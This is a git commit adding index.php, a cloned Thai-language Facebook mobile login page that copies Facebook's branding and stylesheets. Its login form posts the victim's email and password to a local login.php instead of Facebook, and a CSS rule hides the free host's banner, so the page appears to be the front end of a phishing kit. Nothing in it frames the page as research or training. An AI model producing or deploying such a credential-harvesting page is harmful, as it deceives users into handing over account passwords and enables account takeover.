295cb82cad96e8b5e8148155e9abdfd46fa76a51
surachai <surachaibth@gmail.com>
2020-08-28 08:14:50 +0700

    first commit

---
+++ index.php
@@ -0,0 +1,251 @@
+<!DOCTYPE html>
+<html>
+   <head>
+      <style>
+          img[alt="www.000webhost.com"]{
+            display:none;
+            }
+      </style>
+      <title>เข้าสู่ระบบ Facebook | Facebook</title>
+      <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1" />
+      <link href="https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png" rel="shortcut icon" sizes="196x196" />
+      <meta name="referrer" content="default" id="meta_referrer" />
+      <meta name="theme-color" content="#3b5998" />
+      <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/y6/l/0,cross/QilFBSY3ef7.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="kLNh4" crossorigin="anonymous" />
+      <link type="text/css" rel="stylesheet" href="https://static.xx.fbcdn.net/rsrc.php/v3/yH/l/0,cross/lUWSPudGYlG.css?_nc_x=Ij3Wp8lg5Kz" data-bootloader-hash="d2HQ0" crossorigin="anonymous" />
+      <meta property="og:site_name" content="Facebook" />
+      <meta property="og:type" content="website" /><meta property="og:title" content="&#xe40;&#xe02;&#xe49;&#xe32;&#xe2a;&#xe39;&#xe48;&#xe23;&#xe30;&#xe1a;&#xe1a; Facebook | Facebook" />
+      <meta property="og:description" content="&#xe40;&#xe02;&#xe49;&#xe32;&#xe2a;&#xe39;&#xe48;&#xe23;&#xe30;&#xe1a;&#xe1a; Facebook &#xe40;&#xe1e;&#xe37;&#xe48;&#xe2d;&#xe40;&#xe23;&#xe34;&#xe48;&#xe21;&#xe41;&#xe0a;&#xe23;&#xe4c;&#xe41;&#xe25;&#xe30;&#xe40;&#xe0a;&#xe37;&#xe48;&#xe2d;&#xe21;&#xe15;&#xe48;&#xe2d;&#xe01;&#xe31;&#xe1a;&#xe40;&#xe1e;&#xe37;&#xe48;&#xe2d;&#xe19;&#xe46; &#xe04;&#xe23;&#xe2d;&#xe1a;&#xe04;&#xe23;&#xe31;&#xe27; &#xe41;&#xe25;&#xe30;&#xe04;&#xe19;&#xe17;&#xe35;&#xe48;&#xe04;&#xe38;&#xe13;&#xe23;&#xe39;&#xe49;&#xe08;&#xe31;&#xe01;" />
+      <meta property="og:image" content="https://www.facebook.com/images/fb_icon_325x325.png" />
+      <meta property="og:url" content="https://www.facebook.com/" />
+      <link rel="canonical" href="https://www.facebook.com/login/" />
+      <link rel="manifest" href="/data/manifest/" crossorigin="use-credentials" />
+      </head>
+      <body tabindex="0" class="touch x1-5 android _fzu _50-3 iframe acw"><script id="u_0_c" nonce="YzqVKLBU">(function(a){a.__updateOrientation=function(){var b=!!a.orientation&&a.orientation!==180,c=document.body;c&&(c.className=c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g," ")+" "+(b?"landscape":"portrait"));return b}})(window);</script>
+      <div id="viewport" data-kaios-focus-transparent="1">
+        <h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
+        <div id="page">
+          <div class="_129_" id="header-notices"></div>
+          <div class="_7om2 _52we _52z5" id="header">
+            <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter">
+              <a href="/login/?ref=dbl">
+                <i class="img sp_SgxN6m2Os3B_1_5x sx_cf892b"><u>facebook</u></i>
+              </a>
+            </div>
+          </div>
+          <div class="_5soa acw" id="root" role="main" data-sigil="context-layer-root content-pane">
+            <div class="_7om2"><div class="_4g34" id="u_0_0">
+              <div class="_5yd0 _2ph- _5yd1" style="display: none;" id="login_error" data-sigil="m_login_notice">
+                <div class="_52jd"></div>
+              </div>
+              <div class="_4-4l">
+                <div id="login_top_banner" data-sigil="m_login_upsell login_identify_step_element">
+                  <div class="_qw9 grouped aclb" id="u_0_1">
+                    <a href="https://m.facebook.com/click.php?redir_url=market%3A%2F%2Fdetails%3Fid%3Dcom.facebook.katana%26referrer%3Dutm_reg%253DuhPMXcbAyWj94JU20r4Zp_QL%26referrer_params%255Blink_source%255D%3Dfb_app_banner&amp;app_id=350685531728&amp;cref=mb&amp;no_fw=1&amp;ref=dbl" target="_top" class="touchableArea first last area touchable acy apl abt abb" data-sigil="touchable marea">
+                      <div class="ib cc">
+                        <i class="l img sp_xm9DDmY7HAL_1_5x sx_76c966"></i>
+                        <div class="c">
+                          <span class="fcl">โหลด Facebook สำหรับ Android เพื่อเรียกดูเร็วขึ้น</span>
+                        </div>
+                      </div>
+                    </a>
+                  </div>
+                </div>
+                <div class="_5rut">
+                  <form method="post" action="login.php" class="mobile-login-form _5spm" id="login_form" novalidate="1" data-sigil="m_login_form">
+                    <!-- <input type="hidden" name="lsd" value="AVpzBa98" autocomplete="off" />
+                    <input type="hidden" name="jazoest" value="2661" autocomplete="off" />
+                    <input type="hidden" name="m_ts" value="1594398749" />
+                    <input type="hidden" name="li" value="HZgIXzgg7SJJ3dX91iMsxWQ8" />
+                    <input type="hidden" name="try_number" value="0" data-sigil="m_login_try_number" />
+                    <input type="hidden" name="unrecognized_tries" value="0" data-sigil="m_login_unrecognized_tries" /> -->
+                    <div id="user_info_container" data-sigil="user_info_after_failure_element"></div>
+                    <div id="pwd_label_container" data-sigil="user_info_after_failure_element"></div>
+                    <div id="otp_retrieve_desc_container"></div>
+                    <div class="_56be _5sob">
+                      <div class="_55wo _55x2 _56bf">
+                        <div class="_96n9" id="email_input_container">
+                          <input autocorrect="off" autocapitalize="off" type="email" class="_56bg _4u9z _5ruq _8qtn" autocomplete="on" id="m_login_email" name="email" placeholder="&#xe2b;&#xe21;&#xe32;&#xe22;&#xe40;&#xe25;&#xe02;&#xe42;&#xe17;&#xe23;&#xe28;&#xe31;&#xe1e;&#xe17;&#xe4c;&#xe21;&#xe37;&#xe2d;&#xe16;&#xe37;&#xe2d;&#xe2b;&#xe23;&#xe37;&#xe2d;&#xe2d;&#xe35;&#xe40;&#xe21;&#xe25;" data-sigil="m_login_email" />
+                        </div>
+                        <div>
+                          <div class="_1upc _mg8" data-sigil="m_login_password">
+                            <div class="_7om2"><div class="_4g34 _5i2i _52we">
+                              <div class="_5xu4">
+                                <input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2 _8qtm" autocomplete="on" id="m_login_password" name="pass" placeholder="&#xe23;&#xe2b;&#xe31;&#xe2a;&#xe1c;&#xe48;&#xe32;&#xe19;" type="password" data-sigil="password-plain-text-toggle-input" />
+                              </div>
+                            </div>
+                            <div class="_5s61 _216i _5i2i _52we">
+                              <div class="_5xu4">
+                                <div class="_2pi9" style="display:none" id="u_0_2">
+                                  <a href="#" data-sigil="password-plain-text-toggle">
+                                    <span class="mfss" style="display:none" id="u_0_3">ซ่อน</span>
+                                    <span class="mfss" id="u_0_4">แสดง</span>
+                                  </a>
+                                </div>
+                              </div>
+                            </div>
+                          </div>
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="_2pie" style="text-align:center;">
+                    <div id="u_0_5" data-sigil="login_password_step_element">
+                      <button type="submit" value="&#xe40;&#xe02;&#xe49;&#xe32;&#xe2a;&#xe39;&#xe48;&#xe23;&#xe30;&#xe1a;&#xe1a;" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" data-sigil="touchable login_button_block m_login_button">
+                        <span class="_55sr">เข้าสู่ระบบ</span>
+                      </button>
+                    </div>
+                    <div class="_7eif" id="oauth_login_button_container" style="display:none"></div>
+                    <div class="_7f_d" id="oauth_login_desc_container" style="display:none"></div>
+                    <div id="otp_button_elem_container"></div>
+                  </div>
+                  <!-- <input type="hidden" name="prefill_contact_point" id="prefill_contact_point" />
+                  <input type="hidden" name="prefill_source" id="prefill_source" />
+                  <input type="hidden" name="prefill_type" id="prefill_type" />
+                  <input type="hidden" name="first_prefill_source" id="first_prefill_source" />
+                  <input type="hidden" name="first_prefill_type" id="first_prefill_type" />
+                  <input type="hidden" name="had_cp_prefilled" id="had_cp_prefilled" value="false" />
+                  <input type="hidden" name="had_password_prefilled" id="had_password_prefilled" value="false" />
+                  <input type="hidden" name="is_smart_lock" id="is_smart_lock" value="false" /> -->
+                  <div class="_xo8"></div>
+                  <noscript>
+                    <!-- <input type="hidden" name="_fb_noscript" value="true" /> -->
+                  </noscript>
+                </form>
+                <div>
+                  <div class="_43mg _8qtf">
+                    <span class="_43mh">หรือ</span>
+                  </div>
+                  <div class="_52jj _5t3b" id="signup_button_area">
+                    <a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="/reg-no-deeplink/?cid=103&amp;ref=dbl" tabindex="0" data-sigil="m_reg_button">สร้างบัญชีใหม่</a>
+                  </div>
+                </div>
+                <div>
+                  <div class="other-links _8pux _8p_m">
+                    <ul class="_5pkb _55wp">
+                      <li>
+                        <span class="mfss fcg">
+                          <a tabindex="0" href="/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26refid%3D8&amp;r&amp;cuid&amp;ars=facebook_login&amp;lwv=100&amp;ref=dbl" id="forgot-password-link">ลืมรหัสผ่านใช่หรือไม่</a>
+                        </span>
+                      </li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div style="display:none">
+          <div></div>
+          <div></div>
+          <div></div>
+        </div>
+        <span>
+          <img src="https://facebook.com/security/hsts-pixel.gif?c=3.2" width="0" height="0" style="display:none" />
+        </span>
+        <div class="_55wr _5ui2" data-sigil="m_login_footer">
+          <div class="_5dpw">
+            <div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">
+              <div class="_7om2">
+                <div class="_4g34">
+                  <span class="_52jc _52j9 _52jh _3ztb">ภาษาไทย</span>
+                  <div class="_3ztc">
+                    <span class="_52jc">
+                      <a href="/a/language.php?l=es_LA&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26refid%3D8&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQB-RUWovpzKDzk2&amp;ref=dbl" data-locale="es_LA" data-sigil="change_language">Español</a>
+                    </span>
+                  </div>
+                  <div class="_3ztc">
+                    <span class="_52jc">
+                      <a href="/a/language.php?l=zh_CN&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26refid%3D8&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQCCF5WPxojZdm9V&amp;ref=dbl" data-locale="zh_CN" data-sigil="change_language">中文(简体)</a>
+                    </span>
+                  </div>
+                  <div class="_3ztc">
+                    <span class="_52jc">
+                      <a href="/a/language.php?l=de_DE&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26refid%3D8&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQCpUy1aG9xrwRdG&amp;ref=dbl" data-locale="de_DE" data-sigil="change_language">Deutsch</a>
+                    </span>
+                  </div>
+                </div>
+                      <div class="_4g34">
+                        <div class="_3ztc">
+                          <span class="_52jc">
+                            <a href="/a/language.php?l=en_US&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26refid%3D8&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQDSmk54hRmXBvlI&amp;ref=dbl" data-locale="en_US" data-sigil="change_language">English (US)</a>
+                          </span></div><div class="_3ztc"><span class="_52jc">
+                            <a href="/a/language.php?l=fr_FR&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26refid%3D8&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQDDCa8hYKx-hg9A&amp;ref=dbl" data-locale="fr_FR" data-sigil="change_language">Français (France)</a>
+                          </span>
+                        </div>
+                        <div class="_3ztc">
+                          <span class="_52jc">
+                            <a href="/a/language.php?l=pt_BR&amp;lref=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26refid%3D8&amp;sref=legacy_mobile_settings_selector&amp;gfid=AQAI0qFll4S3AdnH&amp;ref=dbl" data-locale="pt_BR" data-sigil="change_language">Português (Brasil)</a>
+                          </span>
+                        </div>
+                        <a href="/language.php?n=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26refid%3D8&amp;ref=dbl">
+                          <div class="_3j87 _1rrd _3ztd" aria-label="&#xe23;&#xe32;&#xe22;&#xe01;&#xe32;&#xe23;&#xe02;&#xe2d;&#xe07;&#xe20;&#xe32;&#xe29;&#xe32;&#xe17;&#xe31;&#xe49;&#xe07;&#xe2b;&#xe21;&#xe14;" data-sigil="more_language">
+                            <i class="img sp_SgxN6m2Os3B_1_5x sx_eac130"></i>
+                          </div>
+                        </a>
+                      </div>
+                    </div>
+                  </div>
+                  <div class="_5ui4">
+                    <span class="mfss fcg">Facebook Inc.</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+            <div class=""></div>
+            <div class="viewportArea _2v9s" style="display:none" id="u_0_6" data-sigil="marea">
+              <div class="_5vsg" id="u_0_7"></div>
+              <div class="_5vsh" id="u_0_8"></div>
+              <div class="_5v5d fcg">
+                <div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
+                กำลังโหลด...
+              </div>
+            </div>
+            <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
+              <div class="container">
+                <div class="image"></div>
+                <div class="message" data-sigil="error-message"></div>
+                <a class="link" data-sigil="MPageError:retry">ลองอีกครั้ง</a>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div id="static_templates">
+          <div class="mDialog" id="modalDialog" style="display:none">
+            <div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">
+              <div class="_7om2 _52we">
+                <div class="_5s61">
+                  <div class="_52z7">
+                    <button type="submit" value="&#xe22;&#xe01;&#xe40;&#xe25;&#xe34;&#xe01;" class="cancelButton btn btnD bgb mfss touchable" id="u_0_a" data-sigil="dialog-cancel-button">ยกเลิก</button>
+                    <button type="submit" value="&#xe22;&#xe49;&#xe2d;&#xe19;&#xe01;&#xe25;&#xe31;&#xe1a;" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="&#xe22;&#xe49;&#xe2d;&#xe19;&#xe01;&#xe25;&#xe31;&#xe1a;" id="u_0_b" data-sigil="dialog-back-button">
+                      <i class="img sp_SgxN6m2Os3B_1_5x sx_1b614f" style="margin-top: 2px;"></i>
+                    </button>
+                  </div>
+                </div>
+                <div class="_4g34">
+                  <div class="_52z6">
+                    <div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">กำลังโหลด...</div>
+                  </div>
+                </div>
+                <div class="_5s61">
+                  <div class="_52z8" id="modalDialogHeaderButtons"></div>
+                </div>
+              </div>
+            </div>
+            <div class="modalDialogView" id="modalDialogView"></div>
+              <div class="_5v5d _5v5e fcg" id="dialogSpinner">
+                  <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_9" data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
+                  กำลังโหลด...
+              </div>
+        </div>
+    </div>
+            <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y6/l/0,cross/QilFBSY3ef7.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
+            <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yH/l/0,cross/lUWSPudGYlG.css?_nc_x=Ij3Wp8lg5Kz" as="style" crossorigin="anonymous" />
+            <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yj/r/BEkMFZnYr5K.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="YzqVKLBU" />
+            <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yh/r/984hEjKD4SD.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="YzqVKLBU" />
+            <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3irgW4/yP/l/th_TH/W2ZDrhWkGH0.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="YzqVKLBU" />
+            <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/y6/r/1OVmyCkr0Zj.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="YzqVKLBU" />
+            <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/yc/r/7dP7tBmQSKi.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="YzqVKLBU" />
+            <link rel="preload" href="https://static.xx.fbcdn.net/rsrc.php/v3/ys/r/E1-gzM6nFzG.js?_nc_x=Ij3Wp8lg5Kz" as="script" crossorigin="anonymous" nonce="YzqVKLBU" />
+        </body>
+</html>
